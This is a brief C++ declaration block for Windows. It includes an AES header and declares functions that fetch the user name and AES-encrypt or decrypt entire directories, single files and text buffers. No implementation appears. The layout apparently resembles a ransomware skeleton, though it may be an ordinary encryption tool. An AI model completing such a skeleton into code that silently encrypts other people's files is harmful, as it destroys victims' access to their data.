#include <iostream>
#include <windows.h>
#include <string>
#include <vector>
#include "AES.hpp"

#define UNLEN 128

using namespace std;

string getUserName();

void EncryptDir(unsigned char* key, string& dirName);

void EncryptFileByAES(unsigned char* key, string& dirName, string& fileName);

void EncryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key, unsigned char* cipher);


void DecryptDir(unsigned char* key, string& dirName);

void DecryptFileByAES(unsigned char* key, string& dirName, string& fileName);

void DecryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key, unsigned char* cipher);
